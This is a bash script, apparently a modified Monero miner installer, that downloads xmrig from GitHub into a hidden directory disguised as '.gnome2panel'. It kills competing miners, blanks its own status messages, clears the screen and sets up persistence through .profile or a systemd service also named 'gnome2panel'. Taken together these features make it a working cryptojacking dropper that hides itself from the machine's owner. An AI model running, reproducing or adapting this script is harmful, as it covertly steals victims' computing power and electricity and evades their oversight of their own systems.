#!/bin/bash

VERSION=2.11

# printing greetings



if [ "$(id -u)" == "0" ]; then
  echo "WARNING: G"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "ERROR: Please specify your w"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  clear
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  clear
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR:"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions


if [ ! -z $EMAIL ]; then
  echo ")"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "t."
else
  echo ""
fi

echo


# start doing stuff: preparing miner

echo "[*] "
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service | grep -m 1 -o "abc" | grep -o "123"
  clear
fi
sudo killall -9 xmrig | grep -m 1 -o "abc" | grep -o "123"
clear
echo "[*] y"
rm -rf $HOME/.gnome2panel

echo "[*] "
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERRORz"
  exit 1
fi

echo "[*] "
[ -d  $HOME/.gnome2panel ] || mkdir  $HOME/.gnome2panel
if ! tar xf /tmp/xmrig.tar.gz -C  $HOME/.gnome2panel; then
  echo "ERROR: C"
  exit 1
fi
rm /tmp/xmrig.tar.gz
clear
echo "[*] Checking if not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/'  $HOME/.gnome2panel/config.json
 $HOME/.gnome2panel/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f  $HOME/.gnome2panel/xmrig ]; then
    echo "WARNING: Advanced version of  is not functional"
  else 
    echo "WARNING: Advanced version was removed by antivirus (or some other problem)"
  fi

  echo "[*] "
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] "
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file "
    exit 1
  fi

  echo "[*] "
  if ! tar xf /tmp/xmrig.tar.gz -C  $HOME/.gnome2panel --strip=1; then
    echo "WARNING: C to  $HOME/. directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/'  $HOME/.gnome2panel/config.json
   $HOME/.gnome2panel/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f  $HOME/.gnome2panel/xmrig ]; then
      echo "ERROR: Stock version is not functional too"
    else 
      echo "ERROR: Stock version  was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*]  OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/'  $HOME/.gnome2panel/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/'  $HOME/.gnome2panel/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "adynewlin-'$PASS'",/'  $HOME/.gnome2panel/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 70,/'  $HOME/.gnome2panel/config.json
sed -i 's#"log-file": *null,#"log-file": "' $HOME/.gnome2panel/xmrig.log'",#'  $HOME/.gnome2panel/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/'  $HOME/.gnome2panel/config.json

cp  $HOME/.gnome2panel/config.json  $HOME/.gnome2panel/config_background.json
sed -i 's/"background": *false,/"background": true,/'  $HOME/.gnome2panel/config_background.json

# preparing script

echo "[*] Creating script"
cat > $HOME/.gnome2panel/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice  $HOME/.gnome2panel/xmrig \$*
else
  echo ""
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x  $HOME/.gnome2panel/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .gnome2panel/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding  "
    echo " $HOME/.gnome2panel/miner.sh --config= $HOME/.gnome2panel/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like "
  fi
  echo "[*] Running "
  /bin/bash  $HOME/.gnome2panel/miner.sh --config= $HOME/.gnome2panel/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] "
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] "
    /bin/bash  $HOME/.gnome2panel/miner.sh --config= $HOME/.gnome2panel/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating "
    cat >/tmp/gnome2panel.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart= $HOME/.gnome2panel/xmrig --config= $HOME/.gnome2panel/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/gnome2panel.service /etc/systemd/system/gnome2panel.service
    echo "[*] "
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable gnome2panel.service
    sudo systemctl start gnome2panel.service
    echo ""
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \ $HOME/.gnome2panel/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \ $HOME/.gnome2panel/config_background.json"
fi
echo ""
clear
clear
clear

echo "[*] Setup complete"



